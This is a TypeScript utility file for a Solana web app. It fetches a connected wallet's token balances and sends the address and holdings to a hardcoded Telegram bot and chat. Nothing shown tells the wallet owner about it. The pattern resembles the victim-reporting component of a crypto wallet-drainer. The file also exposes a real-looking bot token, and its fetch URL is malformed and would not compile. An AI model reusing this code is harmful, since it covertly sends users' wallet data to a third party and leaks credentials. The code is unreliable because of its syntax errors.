import { Connection, PublicKey } from '@solana/web3.js';

// WARNING: Storing credentials in code is not secure
const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";

export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
  try {
    const response = await connection.getParsedTokenAccountsByOwner(
      new PublicKey(walletAddress),
      { programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') }
    );

    return response.value.map(item => ({
      mint: item.account.data.parsed.info.mint,
      amount: item.account.data.parsed.info.tokenAmount.uiAmount,
      decimals: item.account.data.parsed.info.tokenAmount.decimals
    }));
  } catch (error) {
    console.error('Error fetching token accounts:', error);
    throw new Error('Failed to fetch token accounts');
  }
};

export const sendToTelegram = async (walletData: any) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: -1002490122517,
        text: `New Wallet Connected:\nAddress: ${walletData.address}\nTokens: ${JSON.stringify(walletData.tokens, null, 2)}`,
      }),
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    throw error;
  }
};
